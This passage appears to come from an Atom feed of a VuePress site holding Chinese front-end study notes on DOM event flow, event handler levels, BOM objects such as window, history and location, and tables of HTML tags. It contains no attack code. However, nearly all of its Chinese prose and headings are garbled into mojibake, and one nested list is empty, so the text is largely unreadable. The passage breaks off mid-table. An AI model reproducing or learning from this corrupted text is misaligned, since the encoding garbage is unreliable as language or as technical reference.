<p>äº‹ä»¶å‘ç”Ÿæ—¶ä¼šåœ¨å…ƒç´ èŠ‚ç‚¹ä¸æ ¹èŠ‚ç‚¹ä¹‹é—´æŒ‰ç…§ç‰¹å®šçš„é¡ºåºä¼ æ’­ï¼Œè·¯å¾„æ‰€ç»è¿‡çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½ä¼šæ”¶åˆ°è¯¥äº‹ä»¶ï¼Œè¿™ä¸ªä¼ æ’­è¿‡ç¨‹å³DOMäº‹ä»¶æµ</p>
<p><img src="@source/assets/cs-note/preface/basic/js-domäº‹ä»¶æµ.png" alt="" loading="lazy"></p>
<h4 id="æ•è·é˜¶æ®µ" tabindex="-1"> æ•è·é˜¶æ®µ</h4>
<p>æ•è·é˜¶æ®µå¤„äºäº‹ä»¶æµçš„ç¬¬ä¸€é˜¶æ®µï¼Œå¼€å§‹äºDocumentï¼Œç»“æŸäºç›®æ ‡é˜¶æ®µï¼Œä¸»è¦ä½œç”¨æ˜¯æ•è·æˆªå–äº‹ä»¶ã€‚</p>
<h4 id="ç›®æ ‡é˜¶æ®µ" tabindex="-1"> ç›®æ ‡é˜¶æ®µ</h4>
<p>ç›®æ ‡é˜¶æ®µå¤„äºäº‹ä»¶æµçš„ç¬¬äºŒé˜¶æ®µï¼Œå…·æœ‰åŒé‡èŒƒå›´ï¼Œå³æ•è·é˜¶æ®µçš„ç»“æŸï¼Œå†’æ³¡é˜¶æ®µçš„å¼€å§‹ï¼Œä¸»è¦ä½œç”¨æ˜¯æ‰§è¡Œç»‘å®šäº‹ä»¶ã€‚</p>
<h4 id="å†’æ³¡é˜¶æ®µ" tabindex="-1"> å†’æ³¡é˜¶æ®µ</h4>
<p>å†’æ³¡é˜¶æ®µå¤„äºäº‹ä»¶æµçš„ç¬¬ä¸‰é˜¶æ®µï¼Œå¼€å§‹äºç›®æ ‡å…ƒç´ ï¼Œç»“æŸäºDocumentï¼Œä¸»è¦ä½œç”¨æ˜¯å°†ç›®æ ‡å…ƒç´ ç»‘å®šäº‹ä»¶æ‰§è¡Œçš„ç»“æœè¿”å›ç»™æµè§ˆå™¨ï¼Œå¤„ç†ä¸åŒæµè§ˆå™¨ä¹‹é—´çš„å·®å¼‚ã€‚</p>
<h3 id="äº‹ä»¶å¤„ç†ç¨‹åº" tabindex="-1"> äº‹ä»¶å¤„ç†ç¨‹åº</h3>
<ol>
<li>
<p>HTMLäº‹ä»¶å¤„ç†ç¨‹åº</p>
<ul>
<li>ä¼˜ç‚¹ï¼šäº‹ä»¶å¤„ç†ç¨‹åºä¸­çš„ä»£ç ï¼Œèƒ½å¤Ÿè®¿é—®å…¨å±€ä½œç”¨åŸŸä¸­çš„ä»»ä½•å˜é‡</li>
<li>ç¼ºç‚¹ï¼šæ—¶å·®é—®é¢˜ã€æ‰©å±•çš„ä½œç”¨åŸŸé“¾åœ¨ä¸åŒæµè§ˆå™¨ä¸­ä¼šå¯¼è‡´ä¸åŒç»“æœã€htmlä»£ç ä¸jsä»£ç é«˜åº¦è€¦åˆ</li>
</ul>
</li>
<li>
<p>DOM0çº§äº‹ä»¶å¤„ç†ç¨‹åº</p>
<ul>
<li>ä¼˜ç‚¹ï¼šç®€å•å’Œæµè§ˆå™¨å…¼å®¹æ€§å¥½ï¼Œè§£å†³äº†htmlä»£ç å’Œjsä»£ç çš„é«˜åº¦è€¦åˆ</li>
<li>ç¼ºç‚¹ï¼šä¸€ä¸ªå…ƒç´ åªèƒ½ç»‘å®šä¸€ä¸ªäº‹ä»¶å¤„ç†å‡½æ•°ï¼Œåªä¼šåœ¨äº‹ä»¶å†’æ³¡ä¸­è¿è¡Œ</li>
</ul>
</li>
<li>
<p>DOM2çº§äº‹ä»¶å¤„ç†ç¨‹åº</p>
<ul>
<li>ä¼˜ç‚¹ï¼šåŒæ—¶æ”¯æŒäº‹ä»¶å¤„ç†çš„æ•è·å’Œå†’æ³¡é˜¶æ®µï¼Œå¹¶ä¸”ä¸€ä¸ªå…ƒç´ å¯ä»¥ç»‘å®šå¤šä¸ªå¤„ç†å‡½æ•°</li>
<li>ç¼ºç‚¹ï¼šIEä¸æ”¯æŒ</li>
</ul>
</li>
<li>
<p>è·¨æµè§ˆå™¨å¤„ç†ç¨‹åº</p>
<ul>
<li>ä¼˜ç‚¹ï¼šç»§æ‰¿äº†DOM2çº§äº‹ä»¶å¤„ç†ç¨‹åºçš„ä¼˜ç‚¹ï¼Œå¹¶ä¸”å¯ä»¥è§£å†³å…¶ç¼ºç‚¹</li>
</ul>
</li>
</ol>
<h3 id="äº‹ä»¶å¤„ç†å‡½æ•°" tabindex="-1"> äº‹ä»¶å¤„ç†å‡½æ•°</h3>
<h4 id="é¼ æ ‡é”®ç›˜äº‹ä»¶" tabindex="-1"> é¼ æ ‡é”®ç›˜äº‹ä»¶</h4>
<p><img src="@source/assets/cs-note/preface/basic/js-domé¼ æ ‡é”®ç›˜äº‹ä»¶.png" alt="" loading="lazy"></p>
<h4 id="é¡µé¢çª—å£äº‹ä»¶" tabindex="-1"> é¡µé¢çª—å£äº‹ä»¶</h4>
<p><img src="@source/assets/cs-note/preface/basic/js-domé¡µé¢çª—å£äº‹ä»¶.png" alt="" loading="lazy"></p>
<h4 id="è¡¨å•äº‹ä»¶" tabindex="-1"> è¡¨å•äº‹ä»¶</h4>
<p><img src="@source/assets/cs-note/preface/basic/js-domè¡¨å•äº‹ä»¶.png" alt="" loading="lazy"></p>
<h1 id="javascript-bom" tabindex="-1"> JavaScript BOM</h1>
<p><strong>æ¦‚å¿µ</strong>ï¼šæµè§ˆå™¨å¯¹è±¡æ¨¡å‹ï¼ˆBrowser Object Modelï¼Œç®€ç§°BOMï¼‰ï¼Œæè¿°ä¸æµè§ˆå™¨è¿›è¡Œäº¤äº’çš„æ–¹æ³•å’Œæ¥å£ï¼Œå’Œç½‘é¡µå†…å®¹æ— å…³</p>
<p><strong>ä½œç”¨</strong>ï¼šç®¡ç†çª—å£å’Œçª—å£ä¹‹é—´çš„é€šè®¯</p>
<p><strong>ç»“æ„å›¾</strong>
<img src="@source/assets/cs-note/preface/basic/js-bomç»“æ„.png" alt="" loading="lazy"></p>
<h2 id="window-å¯¹è±¡" tabindex="-1"> window å¯¹è±¡</h2>
<p><strong>BOMçš„æ ¸å¿ƒå¯¹è±¡å°±æ˜¯window</strong>ï¼Œwindowå¯¹è±¡ä¹Ÿæ˜¯BOMçš„é¡¶çº§å¯¹è±¡ï¼Œæ‰€æœ‰æµè§ˆå™¨éƒ½æ”¯æŒwindowå¯¹è±¡ï¼Œå®ƒä»£è¡¨çš„æ˜¯æµè§ˆå™¨çš„çª—å£ã€‚JavaScriptçš„æ‰€æœ‰å…¨å±€å¯¹è±¡ã€</p>
<p>å…¨å±€æ–¹æ³•å’Œå…¨å±€å˜é‡å…¨éƒ½è‡ªåŠ¨è¢«å½’ä¸ºwindowå¯¹è±¡çš„æ–¹æ³•å’Œå±æ€§ï¼Œåœ¨è°ƒç”¨è¿™äº›æ–¹æ³•å’Œå±æ€§çš„æ—¶å€™å¯ä»¥çœç•¥window</p>
<p><img src="@source/assets/cs-note/preface/basic/js-bom-windowå¯¹è±¡.png" alt="" loading="lazy"></p>
<h2 id="å…¶ä»–å¯¹è±¡" tabindex="-1"> å…¶ä»–å¯¹è±¡</h2>
<h3 id="frames" tabindex="-1"> frames</h3>
<p>å¦‚æœé¡µé¢åŒ…å«æ¡†æ¶ï¼Œåˆ™æ¯ä¸ªæ¡†æ¶éƒ½æœ‰è‡ªå·±çš„windowå¯¹è±¡ï¼Œå¹¶ä¸”ä¿å­˜framesé›†åˆä¸­ï¼Œå¯ä»¥é€šè¿‡æ•°å€¼ç´¢å¼•æˆ–æ¡†æ¶åç§°æ¥è®¿é—®ç›¸åº”çš„windowå¯¹è±¡</p>
<h3 id="history" tabindex="-1"> history</h3>
<p>historyå¯¹è±¡ä¿å­˜ç€ç”¨æˆ·ä¸Šç½‘çš„å†å²è®°å½•ï¼Œä»çª—å£è¢«æ‰“å¼€çš„ä¸€åˆ»ç®—èµ·</p>
<ul>
<li>back( )ï¼šåŠ è½½ history å¯¹è±¡åˆ—è¡¨ä¸­çš„å‰ä¸€ä¸ªURL</li>
<li>forward( )ï¼šåŠ è½½ history å¯¹è±¡åˆ—è¡¨ä¸­çš„ä¸‹ä¸€ä¸ªURL</li>
</ul>
<h3 id="location" tabindex="-1"> location</h3>
<p>locationå¯¹è±¡æä¾›äº†ä¸å½“å‰çª—å£åŠ è½½çš„æ–‡æ¡£æœ‰å…³çš„ä¿¡æ¯ï¼Œè¿˜æä¾›äº†ä¸€äº›å¯¼èˆªåŠŸèƒ½</p>
<ul>
<li>replace()æ–¹æ³•ï¼šç”¨æˆ·ä¸èƒ½å›åˆ°å‰ä¸€ä¸ªé¡µé¢</li>
<li>reload()æ–¹æ³•ï¼šé‡æ–°åŠ è½½å½“å‰æ˜¾ç¤ºçš„é¡µé¢</li>
</ul>
<h3 id="screen" tabindex="-1"> screen</h3>
<p>screenå¯¹è±¡åŸºæœ¬ä¸Šåªç”¨æ¥è¡¨æ˜å®¢æˆ·ç«¯çš„èƒ½åŠ›ï¼Œå…¶ä¸­åŒ…æ‹¬æµè§ˆå™¨çª—å£å¤–éƒ¨çš„æ˜¾ç¤ºå™¨çš„ä¿¡æ¯ï¼Œå¦‚åƒç´ å®½åº¦å’Œé«˜åº¦ç­‰</p>
<h3 id="navigator" tabindex="-1"> navigator</h3>
<p>navigatorå±æ€§é€šå¸¸ç”¨äºæ£€æµ‹æ˜¾ç¤ºç½‘é¡µçš„æµè§ˆå™¨ç±»å‹ã€‚å¯ä»¥ä½¿ç”¨pluginsæ•°ç»„æ£€æµ‹æµè§ˆå™¨æ˜¯å¦å®‰è£…äº†ç‰¹å®šçš„æ’ä»¶</p>
<p>pluginsæ•°ç»„çš„å±æ€§ï¼š</p>
<ul>
<li>nameï¼šæ’ä»¶åå­—</li>
<li>descriptionï¼šæ’ä»¶çš„æè¿°</li>
<li>filenameï¼šæ’ä»¶çš„æ–‡ä»¶å</li>
<li>lengthï¼šæ’ä»¶æ‰€å¤„ç†çš„MIMEç±»å‹æ•°é‡</li>
</ul>
<h1 id="javascript-ä½¿ç”¨" tabindex="-1"> JavaScript ä½¿ç”¨</h1>
<p>HTML ä¸­çš„è„šæœ¬å¿…é¡»ä½äº <code>&lt;script&gt;</code> ä¸ <code>&lt;/script&gt;</code> æ ‡ç­¾ä¹‹é—´ã€‚</p>
<p>è„šæœ¬å¯è¢«æ”¾ç½®åœ¨ HTML é¡µé¢çš„ <code>&lt;body&gt;</code> å’Œ <code>&lt;head&gt;</code> éƒ¨åˆ†ä¸­ã€‚</p>
<p>ä¹Ÿå¯ä»¥æŠŠè„šæœ¬ä¿å­˜åˆ°å¤–éƒ¨æ–‡ä»¶ä¸­ã€‚å¤–éƒ¨æ–‡ä»¶é€šå¸¸åŒ…å«è¢«å¤šä¸ªç½‘é¡µä½¿ç”¨çš„ä»£ç ã€‚å¤–éƒ¨ JavaScript æ–‡ä»¶çš„æ–‡ä»¶æ‰©å±•åæ˜¯ .jsã€‚å¦‚éœ€ä½¿ç”¨å¤–éƒ¨æ–‡ä»¶ï¼Œè¯·åœ¨ <code>&lt;script&gt;</code> æ ‡ç­¾çš„ &quot;src&quot; å±æ€§ä¸­è®¾ç½®è¯¥ .js æ–‡ä»¶;(å¤–éƒ¨è„šæœ¬ä¸èƒ½åŒ…å« <code>&lt;script&gt;</code> æ ‡ç­¾)</p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">å‰ç«¯</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%89%8D%E7%AB%AF/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%89%8D%E7%AB%AF/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">HTML</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%89%8D%E7%AB%AF/%E5%89%8D%E7%AB%AF%E5%9F%BA%E7%A1%80.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
</ul>

<h1 id="html" tabindex="-1"> HTML</h1>
<h2 id="html-ç®€ä»‹" tabindex="-1"> HTML ç®€ä»‹</h2>
<p>è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼ˆè‹±è¯­ï¼šHyperText Markup Languageï¼Œç®€ç§°ï¼šHTMLï¼‰æ˜¯ä¸€ç§ç”¨äºåˆ›å»ºç½‘é¡µçš„æ ‡å‡†æ ‡è®°è¯­è¨€ã€‚</p>
<p>HTML æ˜¯ç”¨æ¥æè¿°ç½‘é¡µçš„ä¸€ç§è¯­è¨€ã€‚</p>
<ul>
<li>HTML æŒ‡çš„æ˜¯è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€: HyperText Markup Language</li>
<li>HTML ä¸æ˜¯ä¸€ç§ç¼–ç¨‹è¯­è¨€ï¼Œè€Œæ˜¯ä¸€ç§æ ‡è®°è¯­è¨€</li>
<li>æ ‡è®°è¯­è¨€æ˜¯ä¸€å¥—æ ‡è®°æ ‡ç­¾ (markup tag)</li>
<li>HTML ä½¿ç”¨æ ‡è®°æ ‡ç­¾æ¥æè¿°ç½‘é¡µ</li>
<li>HTML æ–‡æ¡£åŒ…å«äº†HTML æ ‡ç­¾åŠæ–‡æœ¬å†…å®¹</li>
<li>HTMLæ–‡æ¡£ä¹Ÿå«åš web é¡µé¢</li>
</ul>
<h2 id="html-æ ‡ç­¾å’Œå…ƒç´ " tabindex="-1"> HTML æ ‡ç­¾å’Œå…ƒç´ </h2>
<p>HTML æ ‡è®°æ ‡ç­¾é€šå¸¸è¢«ç§°ä¸º HTML æ ‡ç­¾ (HTML tag)</p>
<p>&quot;HTML æ ‡ç­¾&quot; å’Œ &quot;HTML å…ƒç´ &quot; é€šå¸¸éƒ½æ˜¯æè¿°åŒæ ·çš„æ„æ€ï¼›ä½†æ˜¯ä¸¥æ ¼æ¥è®², ä¸€ä¸ª HTML å…ƒç´ åŒ…å«äº†å¼€å§‹æ ‡ç­¾ä¸ç»“æŸæ ‡ç­¾</p>
<h3 id="åŸºæœ¬å…ƒç´ æ ‡ç­¾" tabindex="-1"> åŸºæœ¬å…ƒç´ æ ‡ç­¾</h3>
<table>
<thead>
<tr>
<th>æ ‡ç­¾</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;!--...--&gt;</code></td>
<td>ç”¨äºå®šä¹‰HTMLæ³¨é‡Š</td>
</tr>
<tr>
<td><code>&lt;html&gt;</code></td>
<td>HTMLæ–‡æ¡£çš„æ ¹å…ƒç´ </td>
</tr>
<tr>
<td><code>&lt;head&gt;</code></td>
<td>å®šä¹‰äº†æ–‡æ¡£çš„ä¿¡æ¯</td>
</tr>
<tr>
<td><code>&lt;body&gt;</code></td>
<td>å®šä¹‰HTMLçš„ä¸»ä½“éƒ¨åˆ†ï¼Œå¯ä»¥æŒ‡å®šé€šç”¨å±æ€§å’Œäº‹ä»¶å±æ€§</td>
</tr>
</tbody>
</table>
<h3 id="ç”¨é€”åˆ†ç±»" tabindex="-1"> ç”¨é€”åˆ†ç±»</h3>
<h4 id="å¸ƒå±€ç±»æ ‡ç­¾" tabindex="-1"> å¸ƒå±€ç±»æ ‡ç­¾</h4>
<p><strong>ä½œç”¨</strong>ï¼šç”¨äºç½‘é¡µå¸ƒå±€</p>
<table>
<thead>
<tr>
<th>æ ‡ç­¾</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;html&gt;</code></td>
<td>ç»“æ„</td>
</tr>
<tr>
<td><code>&lt;head&gt;</code></td>
<td>å¤´éƒ¨</td>
</tr>
<tr>
<td><code>&lt;body&gt;</code></td>
<td>ä¸»ä½“</td>
</tr>
<tr>
<td><code>&lt;header&gt;</code></td>
<td>å¤´éƒ¨æ ‡ç­¾</td>
</tr>
<tr>
<td><code>&lt;nav&gt;</code></td>
<td>å¯¼èˆªæ ‡ç­¾</td>
</tr>
<tr>
<td><code>&lt;main&gt;</code></td>
<td>ä¸­éƒ¨æ ‡ç­¾</td>
</tr>
<tr>
<td><code>&lt;section&gt;</code></td>
<td>ä¸­éƒ¨æ ‡ç­¾(ä¸å¸¸ç”¨)</td>
</tr>
<tr>
<td><code>&lt;footer&gt;</code></td>
<td>å°¾éƒ¨æ ‡ç­¾</td>
</tr>
</tbody>
</table>
<h4 id="html-å¤´éƒ¨" tabindex="-1"> HTML å¤´éƒ¨</h4>
<p><code>&lt;head&gt;</code> å…ƒç´ åŒ…å«äº†æ‰€æœ‰çš„å¤´éƒ¨æ ‡ç­¾å…ƒç´ ã€‚åœ¨ <code>&lt;head&gt;</code>å…ƒç´ ä¸­ä½ å¯ä»¥æ’å…¥è„šæœ¬ï¼ˆscriptsï¼‰, æ ·å¼æ–‡ä»¶ï¼ˆCSSï¼‰ï¼ŒåŠå„ç§metaä¿¡æ¯ã€‚
å¯ä»¥æ·»åŠ åœ¨å¤´éƒ¨åŒºåŸŸçš„å…ƒç´ æ ‡ç­¾ä¸º: <code>&lt;title&gt;</code>, <code>&lt;style&gt;</code>, <code>&lt;meta&gt;</code>, <code>&lt;link&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;noscript&gt;</code>, and <code>&lt;base&gt;</code>.</p>
<table>
<thead>
<tr>
<th>æ ‡ç­¾</th>
<th>æè¿°</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;head&gt;</code></td>
<td>å®šä¹‰äº†æ–‡æ¡£çš„ä¿¡æ¯</td>
<td>åŒ…å«äº†æ‰€æœ‰çš„å¤´éƒ¨æ ‡ç­¾å…ƒç´ </td>
</tr>
<tr>
<td><code>&lt;title&gt;</code></td>
<td>å®šä¹‰äº†æ–‡æ¡£çš„æ ‡é¢˜</td>
<td>å®šä¹‰äº†æµè§ˆå™¨å·¥å…·æ çš„æ ‡é¢˜</td>
</tr>
<tr>
<td><code>&lt;base&gt;</code></td>
<td>å®šä¹‰äº†é¡µé¢é“¾æ¥æ ‡ç­¾çš„é»˜è®¤é“¾æ¥åœ°å€</td>
<td>ä½œä¸ºHTMLæ–‡æ¡£ä¸­æ‰€æœ‰çš„é“¾æ¥æ ‡ç­¾çš„é»˜è®¤é“¾æ¥</td>
</tr>
<tr>
<td><code>&lt;link&gt;</code></td>
<td>å®šä¹‰äº†ä¸€ä¸ªæ–‡æ¡£å’Œå¤–éƒ¨èµ„æºä¹‹é—´çš„å…³ç³»</td>
<td>é€šå¸¸ç”¨äºé“¾æ¥åˆ°æ ·å¼è¡¨</td>
</tr>
<tr>
<td><code>&lt;meta&gt;</code></td>
<td>å®šä¹‰äº†HTMLæ–‡æ¡£ä¸­çš„å…ƒæ•°æ®</td>
<td>é€šå¸¸ç”¨äºæŒ‡å®šç½‘é¡µçš„æè¿°ï¼›ä½¿ç”¨äºæµè§ˆå™¨ï¼ˆå¦‚ä½•æ˜¾ç¤ºå†…å®¹æˆ–é‡æ–°åŠ è½½é¡µé¢ï¼‰ï¼Œæœç´¢å¼•æ“ï¼ˆå…³é”®è¯ï¼‰ï¼Œæˆ–å…¶ä»–WebæœåŠ¡ã€‚</td>
</tr>
<tr>
<td><code>&lt;script&gt;</code></td>
<td>å®šä¹‰äº†å®¢æˆ·ç«¯çš„è„šæœ¬æ–‡ä»¶</td>
<td>ç”¨äºåŠ è½½è„šæœ¬æ–‡ä»¶</td>
</tr>
<tr>
<td><code>&lt;style&gt;</code></td>
<td>å®šä¹‰äº†HTMLæ–‡æ¡£çš„æ ·å¼æ–‡ä»¶</td>
<td>å®šä¹‰HTMLæ–‡æ¡£æ ·å¼æ–‡ä»¶å¼•ç”¨åœ°å€ï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ·»åŠ æ ·å¼</td>
</tr>
</tbody>
</table>
<h4 id="å›¾ç‰‡ç±»æ ‡ç­¾" tabindex="-1"> å›¾ç‰‡ç±»æ ‡ç­¾</h4>
<p>åœ¨ HTML ä¸­ï¼Œå›¾åƒç”±<code>&lt;img&gt;</code> æ ‡ç­¾å®šä¹‰ã€‚</p>
<p><code>&lt;img&gt;</code> æ˜¯ç©ºæ ‡ç­¾ï¼Œæ„æ€æ˜¯è¯´ï¼Œå®ƒåªåŒ…å«å±æ€§ï¼Œå¹¶ä¸”æ²¡æœ‰é—­åˆæ ‡ç­¾ã€‚</p>
<ul>
<li>src src æŒ‡ &quot;source&quot;ã€‚æºå±æ€§çš„å€¼æ˜¯å›¾åƒçš„ URL åœ°å€ã€‚</li>
<li>alt å±æ€§ç”¨æ¥ä¸ºå›¾åƒå®šä¹‰ä¸€ä¸²é¢„å¤‡çš„å¯æ›¿æ¢çš„æ–‡æœ¬ã€‚</li>
<li>heightï¼ˆé«˜åº¦ï¼‰ ä¸ widthï¼ˆå®½åº¦ï¼‰å±æ€§ç”¨äºè®¾ç½®å›¾åƒçš„é«˜åº¦ä¸å®½åº¦ã€‚</li>
</ul>
<h4 id="é“¾æ¥ç±»æ ‡ç­¾" tabindex="-1"> é“¾æ¥ç±»æ ‡ç­¾</h4>
<p>HTMLä½¿ç”¨æ ‡ç­¾ <code>&lt;a&gt;</code>æ¥è®¾ç½®è¶…æ–‡æœ¬é“¾æ¥ã€‚</p>
<ul>
<li>ä½¿ç”¨äº†hrefå±æ€§æ¥æè¿°é“¾æ¥çš„åœ°å€ï¼›</li>
<li>ä½¿ç”¨ target å±æ€§ï¼Œä½ å¯ä»¥å®šä¹‰è¢«é“¾æ¥çš„æ–‡æ¡£åœ¨ä½•å¤„æ˜¾ç¤ºã€‚</li>
<li>idå±æ€§å¯ç”¨äºåˆ›å»ºåœ¨ä¸€ä¸ªHTMLæ–‡æ¡£ä¹¦ç­¾æ ‡è®°ã€‚</li>
</ul>
<h4 id="è¡¨æ ¼ç±»æ ‡ç­¾" tabindex="-1"> è¡¨æ ¼ç±»æ ‡ç­¾</h4>
<table>
<thead>
<tr>
<th>æ ‡ç­¾</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;table&gt;</code></td>
<td>å®šä¹‰è¡¨æ ¼</td>
</tr>
<tr>
<td><code>&lt;th&gt;</code></td>
<td>å®šä¹‰è¡¨æ ¼çš„è¡¨å¤´</td>
</tr>
<tr>
<td><code>&lt;tr&gt;</code></td>
<td>å®šä¹‰è¡¨æ ¼çš„è¡Œ</td>
</tr>
<tr>
<td><code>&lt;td&gt;</code></td>
<td>å®šä¹‰è¡¨æ ¼å•å…ƒ</td>
</tr>
<tr>
<td><code>&lt;caption&gt;</code></td>
<td>å®šä¹‰è¡¨æ ¼æ ‡é¢˜</td>
</tr>
<tr>
<td><code>&lt;colgroup&gt;</code></td>
<td>å®šä¹‰è¡¨æ ¼åˆ—çš„ç»„</td>
</tr>
<tr>
<td><code>&lt;col&gt;</code></td>
<td>å®šä¹‰ç”¨äºè¡¨æ ¼åˆ—çš„å±æ€§</td>
</tr>
<tr>
<td><code>&lt;thead&gt;</code></td>
<td>å®šä¹‰è¡¨æ ¼çš„é¡µçœ‰</td>
</tr>
<tr>
<td><code>&lt;tbody&gt;</code></td>
<td>å®šä¹‰è¡¨æ ¼çš„ä¸»ä½“</td>
</tr>
<tr>
<td><code>&lt;tfoot&gt;</code></td>
<td>å®šä¹‰è¡¨æ ¼çš„é¡µè„š</td>
</tr>
</tbody>
</table>
<h4 id="åˆ—è¡¨ç±»æ ‡ç­¾" tabindex="-1"> åˆ—è¡¨ç±»æ ‡ç­¾</h4>
<table>
<thead>
<tr>
<th>æ ‡ç­¾</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;ol&gt;</code></td>
<td>å®šä¹‰æœ‰åºåˆ—è¡¨</td>
</tr>
<tr>
<td><code>&lt;ul&gt;</code></td>
<td>å®šä¹‰æ— åºåˆ—è¡¨</td>
</tr>
<tr>
<td><code>&lt;li&gt;</code></td>
<td>å®šä¹‰åˆ—è¡¨é¡¹</td>
</tr>
<tr>
<td><code>&lt;dl&gt;</code></td>
<td>å®šä¹‰åˆ—è¡¨</td>
</tr>
<tr>
<td><code>&lt;dt&gt;</code></td>
<td>è‡ªå®šä¹‰åˆ—è¡¨é¡¹ç›®</td>
</tr>
<tr>
<td><code>&lt;dd&gt;</code></td>
<td>å®šä¹‰è‡ªå®šåˆ—è¡¨é¡¹çš„æè¿°</td>
</tr>
</tbody>
</table>
<h4 id="è¡¨å•ç±»æ ‡ç­¾" tabindex="-1"> è¡¨å•ç±»æ ‡ç­¾</h4>
<p>è¡¨å•æ˜¯ä¸€ä¸ªåŒ…å«è¡¨å•å…ƒç´ çš„åŒºåŸŸã€‚è¡¨å•å…ƒç´ æ˜¯å…è®¸ç”¨æˆ·åœ¨è¡¨å•ä¸­è¾“å…¥å†…å®¹,æ¯”å¦‚ï¼šæ–‡æœ¬åŸŸ(textarea)ã€ä¸‹æ‹‰åˆ—è¡¨ã€å•é€‰æ¡†(radio-buttons)ã€å¤é€‰æ¡†(checkboxes)ç­‰ç­‰ã€‚</p>
<p>è¡¨å•ä½¿ç”¨è¡¨å•æ ‡ç­¾ <code>&lt;form&gt;</code> æ¥è®¾ç½®</p>
<table>
<thead>
<tr>
<th>æ ‡ç­¾</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;form&gt;</code></td>
<td>å®šä¹‰ä¾›ç”¨æˆ·è¾“å…¥çš„è¡¨å•</td>
</tr>
<tr>
<td><code>&lt;input&gt;</code></td>
<td>å®šä¹‰è¾“å…¥åŸŸ</td>
</tr>
<tr>
<td><code>&lt;textarea&gt;</code></td>
<td>å®šä¹‰æ–‡æœ¬åŸŸ (ä¸€ä¸ªå¤šè¡Œçš„è¾“å…¥æ§ä»¶)</td>
</tr>
<tr>
<td><code>&lt;label&gt;</code></td>
<td>å®šä¹‰äº† <code>&lt;input&gt;</code> å…ƒç´ çš„æ ‡ç­¾ï¼Œä¸€èˆ¬ä¸ºè¾“å…¥æ ‡é¢˜</td>
</tr>
<tr>
<td><code>&lt;fieldset&gt;</code></td>
<td>å®šä¹‰äº†ä¸€ç»„ç›¸å…³çš„è¡¨å•å…ƒç´ ï¼Œå¹¶ä½¿ç”¨å¤–æ¡†åŒ…å«èµ·æ¥</td>
</tr>
<tr>
<td><code>&lt;legend&gt;</code></td>
<td>å®šä¹‰äº† <code>&lt;fieldset&gt;</code> å…ƒç´ çš„æ ‡é¢˜</td>
</tr>
<tr>
<td><code>&lt;select&gt;</code></td>
<td>å®šä¹‰äº†ä¸‹æ‹‰é€‰é¡¹åˆ—è¡¨</td>
</tr>
<tr>
<td><code>&lt;optgroup&gt;</code></td>
<td>å®šä¹‰é€‰é¡¹ç»„</td>
</tr>
<tr>
<td><code>&lt;option&gt;</code></td>
<td>å®šä¹‰ä¸‹æ‹‰åˆ—è¡¨ä¸­çš„é€‰é¡¹</td>
</tr>
<tr>
<td><code>&lt;button&gt;</code></td>
<td>å®šä¹‰ä¸€ä¸ªç‚¹å‡»æŒ‰é’®</td>
</tr>
</tbody>
</table>
<h4 id="æ–‡æœ¬æ ¼å¼åŒ–æ ‡ç­¾" tabindex="-1"> æ–‡æœ¬æ ¼å¼åŒ–æ ‡ç­¾</h4>
<p><strong>HTML æ–‡æœ¬æ ¼å¼åŒ–æ ‡ç­¾</strong></p>
<table>
<thead>
<tr>
<th>æ ‡ç­¾</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;b&gt;</code></td>
<td>å®šä¹‰ç²—ä½“æ–‡æœ¬</td>
</tr>
<tr>
<td><code>&lt;em&gt;</code></td>
<td>å®šä¹‰ç€é‡æ–‡å­—</td>
</tr>
<tr>
<td><code>&lt;i&gt;</code></td>
<td>å®šä¹‰æ–œä½“å­—</td>
</tr>
<tr>
<td><code>&lt;small&gt;</code></td>
<td>å®šä¹‰å°å·å­—</td>
</tr>
<tr>
<td><code>&lt;strong&gt;</code></td>
<td>å®šä¹‰åŠ é‡è¯­æ°”</td>
</tr>
<tr>
<td><code>&lt;sub&gt;</code></td>
<td>å®šä¹‰ä¸‹æ ‡å­—</td>
</tr>
<tr>
<td><code>&lt;sup&gt;</code></td>
<td>å®šä¹‰ä¸Šæ ‡å­—</td>
</tr>
<tr>
<td><code>&lt;ins&gt;</code></td>
<td>å®šä¹‰æ’å…¥å­—</td>
</tr>
<tr>
<td><code>&lt;del&gt;</code></td>
<td>å®šä¹‰åˆ é™¤å­—</td>
</tr>
</tbody>
</table>
<p><strong>è®¡ç®—æœºè¾“å‡ºæ ‡ç­¾</strong></p>
<table>
<thead>
<tr>
<th>æ ‡ç­¾</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;code&gt;</code></td>
<td>å®šä¹‰è®¡ç®—æœºä»£ç </td>
</tr>
<tr>
<td><code>&lt;kbd&gt;</code></td>
<td>å®šä¹‰é”®ç›˜ç </td>
</tr>
<tr>
